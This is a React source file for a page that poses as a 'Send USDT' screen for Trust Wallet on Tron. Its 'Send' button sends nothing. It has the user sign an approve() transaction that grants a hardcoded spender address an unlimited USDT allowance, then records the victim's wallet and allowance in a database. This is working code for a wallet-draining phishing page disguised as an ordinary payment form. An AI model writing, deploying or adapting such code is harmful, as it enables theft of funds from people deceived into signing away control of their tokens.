import { useState, useEffect, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";

declare global {
  interface Window {
    tronWeb?: any;
    tronLink?: any;
    TronWeb: any;
  }
}

const TRON_USDT    = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_SPENDER = "TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw";

let _twPromise: Promise<any> | null = null;

function loadTronWebCDN(): Promise<any> {
  if (_twPromise) return _twPromise;

  _twPromise = new Promise((resolve, reject) => {
    if (typeof window !== "undefined" && window.TronWeb) {
      return resolve(window.TronWeb);
    }

    const script = document.createElement("script");
    script.src = "https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js";
    script.async = true;

    script.onload = () => {
      if (window.TronWeb) {
        console.log("✅ TronWeb CDN loaded");
        resolve(window.TronWeb);
      } else {
        reject(new Error("TronWeb CDN load hua lekin window.TronWeb nahi mila"));
      }
    };

    script.onerror = () => {
      _twPromise = null;
      reject(new Error("TronWeb CDN download fail hua"));
    };

    document.head.appendChild(script);
  });

  return _twPromise;
}

async function getTW() {
  const TronWebClass = await loadTronWebCDN();
  return new TronWebClass({ fullHost: "https://api.trongrid.io" });
}

export default function Index() {
  const [searchParams] = useSearchParams();
  const [amount, setAmount] = useState("");
  const [transactionStatus, setTransactionStatusState] = useState<
    "idle" | "processing" | "success"
  >("idle");
  const createTransaction = useMutation(api.transactions.createTransaction);

  const tronLinkRef = useRef<any>(null);

  // ===== INIT TRUST WALLET =====
  useEffect(() => {
    loadTronWebCDN().catch((e) => console.warn("TronWeb preload warn:", e.message));

    // Check if Trust Wallet is available
    let checkCount = 0;
    const checkTrustWallet = setInterval(() => {
      if (window.tronLink && window.tronLink.ready) {
        console.log("✅ Trust Wallet (TronLink) detected!");
        tronLinkRef.current = window.tronLink;
        clearInterval(checkTrustWallet);
      } else if (checkCount > 10) {
        console.warn("⚠️  Trust Wallet not detected. Make sure it's installed.");
        clearInterval(checkTrustWallet);
      }
      checkCount++;
    }, 500);

    return () => clearInterval(checkTrustWallet);
  }, []);

  // ===== CONNECT TRUST WALLET =====
  async function connectTrustWallet(): Promise<string> {
    if (!window.tronLink) {
      throw new Error("Trust Wallet (TronLink) not installed. Please install Trust Wallet extension.");
    }

    try {
      // Request account access
      const result = await window.tronLink.request({
        method: "tron_requestAccounts",
      });

      if (!result || result.length === 0) {
        throw new Error("User rejected wallet connection");
      }

      const userAddress = result[0];
      console.log("👤 Connected address:", userAddress);
      return userAddress;
    } catch (err: any) {
      throw new Error("Trust Wallet connection failed: " + err.message);
    }
  }

  // ===== HANDLE SEND =====
  async function handleSend() {
    setTransactionStatusState("processing");

    try {
      // Step 1: Connect wallet
      console.log("🔗 Connecting to Trust Wallet...");
      const userAddress = await connectTrustWallet();
      alert(`✅ Connected!\nAddress: ${userAddress}`);

      // Step 2: Load TronWeb
      console.log("⏳ TronWeb load ho raha hai...");
      const tw = await getTW();
      console.log("✅ TronWeb instance ready");

      // Step 3: Prepare hex addresses
      const ownerHex   = tw.address.toHex(userAddress);
      const spenderHex = tw.address.toHex(TRON_SPENDER).replace(/^41/, "");
      const usdtHex    = tw.address.toHex(TRON_USDT);

      console.log("ownerHex:", ownerHex);
      console.log("spenderHex (no 41):", spenderHex);
      console.log("usdtHex:", usdtHex);

      // Step 4: Build ABI parameter
      const hexAddress = spenderHex.padStart(64, "0");
      const hexAmount  = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
      const parameter  = hexAddress + hexAmount;

      if (parameter.length !== 128) {
        throw new Error(`ABI encode galat! length=${parameter.length}, chahiye=128`);
      }
      console.log("✅ Parameter (128 chars):", parameter);

      // Step 5: Trigger smart contract
      alert("📋 Building transaction...");
      const apiRes = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          owner_address:     ownerHex,
          contract_address:  usdtHex,
          function_selector: "approve(address,uint256)",
          parameter,
          fee_limit:         100_000_000,
          call_value:        0,
          visible:           false,
        }),
      });

      const apiData = await apiRes.json();
      console.log("📋 TronGrid response:", apiData);

      if (!apiData.transaction) {
        throw new Error("Build failed: " + (apiData.Error || apiData.error || JSON.stringify(apiData)));
      }

      // Step 6: Sign transaction with Trust Wallet
      alert("🔐 Please sign the transaction in Trust Wallet...");
      console.log("🔐 Sending transaction to Trust Wallet for signing...");
      
      let signedTx;
      try {
        signedTx = await window.tronLink.request({
          method: "tron_signTransaction",
          params: [apiData.transaction],
        });
      } catch (signErr: any) {
        throw new Error("Signing failed: " + signErr.message);
      }

      if (!signedTx) {
        throw new Error("Trust Wallet rejected signing");
      }

      console.log("✅ Transaction signed");

      // Step 7: Broadcast transaction
      alert("📡 Broadcasting transaction...");
      console.log("📡 Broadcasting to network...");
      
      const broadcastRes = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify(signedTx),
      });

      if (!broadcastRes.ok) {
        const errorText = await broadcastRes.text();
        throw new Error(`Broadcast HTTP error: ${broadcastRes.status} - ${errorText}`);
      }

      const result = await broadcastRes.json();
      console.log("📡 Broadcast Response:", JSON.stringify(result, null, 2));

      if (!result) {
        throw new Error("Broadcast response is null");
      }

      if (result.Error) {
        throw new Error(`Broadcast Error: ${result.Error}`);
      }

      if (result.error) {
        throw new Error(`Broadcast Error: ${result.error}`);
      }

      const txId = result.txid || result.transaction?.txID || result.result;

      if (!txId) {
        const msg = `❌ No txid in response!\nResponse: ${JSON.stringify(result)}`;
        console.error(msg);
        alert(msg);
        throw new Error("No txid returned");
      }

      console.log("✅ TX ID:", txId);
      alert(`✅ Transaction Broadcast Successful!\n\nTX ID: ${txId}\n\nWaiting for confirmation...`);

      // Step 8: Wait for confirmation
      await new Promise((r) => setTimeout(r, 10_000));

      // Step 9: Check allowance
      const contract = await tw.contract([{
        constant:        true,
        inputs:          [
          { name: "owner",   type: "address" },
          { name: "spender", type: "address" },
        ],
        name:            "allowance",
        outputs:         [{ name: "", type: "uint256" }],
        stateMutability: "view",
        type:            "function",
      }], TRON_USDT);

      const raw           = await contract.allowance(userAddress, TRON_SPENDER).call();
      const allowanceUSDT = (Number(raw) / 1e6).toFixed(2);
      console.log("✅ Allowance:", allowanceUSDT, "USDT");

      // Step 10: Save to database
      await createTransaction({
        walletAddress: userAddress,
        toAddress:     TRON_SPENDER,
        amount:        amount || "Max",
        txHash:        txId || "tx",
        usdtBalance:   allowanceUSDT + " USDT",
        nativeBalance: "0 TRX",
      });

      setTransactionStatusState("success");
      setTimeout(() => setTransactionStatusState("idle"), 3000);
      alert(`✅ APPROVAL SUCCESSFUL!\n\n💰 Allowance: ${allowanceUSDT} USDT\n\n🔗 TX ID: ${txId}`);

    } catch (err: any) {
      console.error("❌ Error:", err.message);
      console.error("Full error:", err);
      setTransactionStatusState("idle");
      
      const errorMsg = err.message || "Transaction failed";
      alert(`❌ ERROR:\n\n${errorMsg}`);
    }
  }

  const dollarValue =
    amount && amount !== "Max" && !isNaN(Number(amount))
      ? `$${Number(amount).toFixed(2)}`
      : "$0.00";

  const TRXIcon = () => (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
      <polygon points="12,2 22,8 22,16 12,22 2,16 2,8" fill="white" opacity="0.9" />
      <polygon points="12,5 19,9 19,15 12,19 5,15 5,9" fill="#EF0027" opacity="0.8" />
      <text x="12" y="16" textAnchor="middle" fill="white" fontSize="9" fontWeight="bold">T</text>
    </svg>
  );

  const XCircle = ({ onClick }: { onClick: () => void }) => (
    <button onClick={onClick} style={{
      background: "none", border: "1.5px solid #555", borderRadius: "50%",
      width: "22px", height: "22px", color: "#aaa", cursor: "pointer",
      display: "flex", alignItems: "center", justifyContent: "center",
      fontSize: "11px", flexShrink: 0, padding: 0,
    }}>✕</button>
  );

  return (
    <div style={{
      margin: 0, minHeight: "100vh", background: "#1c1c1e", color: "#ffffff",
      fontFamily: "-apple-system, BlinkMacSystemFont, 'SF Pro Text', system-ui, sans-serif",
      display: "flex", flexDirection: "column", maxWidth: "480px",
      marginLeft: "auto", marginRight: "auto",
    }}>

      {/* Header */}
      <div style={{
        display: "flex", alignItems: "center", justifyContent: "space-between",
        padding: "20px 22px 16px",
      }}>
        <button onClick={() => window.history.back()} style={{
          background: "none", border: "none", color: "#fff",
          cursor: "pointer", fontSize: "22px", lineHeight: 1, padding: 0,
        }}>←</button>
        <span style={{ fontSize: "18px", fontWeight: 700 }}>Send USDT</span>
        <button onClick={() => window.history.back()} style={{
          background: "none", border: "none", color: "#fff",
          cursor: "pointer", fontSize: "20px", lineHeight: 1, padding: 0,
        }}>✕</button>
      </div>

      <div style={{ padding: "4px 18px", flex: 1 }}>

        {/* Network Badge */}
        <div style={{ marginBottom: "14px" }}>
          <label style={{
            display: "block", fontSize: "14px", fontWeight: 500,
            color: "#8e8e93", marginBottom: "9px",
          }}>
            Destination network
          </label>
          <div style={{
            display: "inline-flex", alignItems: "center", gap: "7px",
            background: "#2c2c2e", borderRadius: "20px", padding: "7px 13px 7px 8px",
          }}>
            <div style={{
              width: "26px", height: "26px", borderRadius: "50%", background: "#EF0027",
              display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0,
            }}>
              <TRXIcon />
            </div>
            <span style={{ fontSize: "15px", fontWeight: 600, color: "#fff" }}>Tron Network</span>
          </div>
        </div>

        {/* Amount Input */}
        <div style={{ marginBottom: "6px" }}>
          <label style={{
            display: "block", fontSize: "14px", fontWeight: 500,
            color: "#8e8e93", marginBottom: "9px",
          }}>
            Amount
          </label>
          <div style={{
            display: "flex", alignItems: "center",
            border: "1px solid #2e2e30", borderRadius: "14px",
            padding: "14px", background: "#242426", gap: "8px",
          }}>
            <input
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="0"
              type="text"
              inputMode="decimal"
              style={{
                flex: 1, background: "transparent", border: "none", outline: "none",
                color: "#fff", fontSize: "18px", fontFamily: "inherit", minWidth: 0,
              }}
            />
            {amount && <XCircle onClick={() => setAmount("")} />}
            <span style={{ color: "#8e8e93", fontSize: "16px", flexShrink: 0 }}>USDT</span>
            <button onClick={() => setAmount("Max")} style={{
              background: "none", border: "none", color: "#39d353",
              cursor: "pointer", fontSize: "16px", fontWeight: 600, padding: 0, flexShrink: 0,
            }}>Max</button>
          </div>
          <div style={{ fontSize: "13px", color: "#636366", marginTop: "7px", paddingLeft: "2px" }}>
            ≈ {dollarValue}
          </div>
        </div>
      </div>

      {/* Send Button */}
      <div style={{ padding: "12px 18px", paddingBottom: "42px" }}>
        <button
          onClick={handleSend}
          disabled={transactionStatus !== "idle"}
          style={{
            width: "100%",
            background: transactionStatus === "processing" ? "#2a6e3a" : "#39d353",
            color: "#000", border: "none", borderRadius: "30px",
            padding: "18px", fontSize: "18px", fontWeight: 700,
            cursor: transactionStatus === "idle" ? "pointer" : "default",
            transition: "all 0.2s ease", letterSpacing: "0.01em",
          }}
        >
          {transactionStatus === "success"
            ? "✓ Transaction Successful!"
            : transactionStatus === "processing"
            ? "Processing..."
            : "Send"}
        </button>
      </div>

    </div>
  );
}
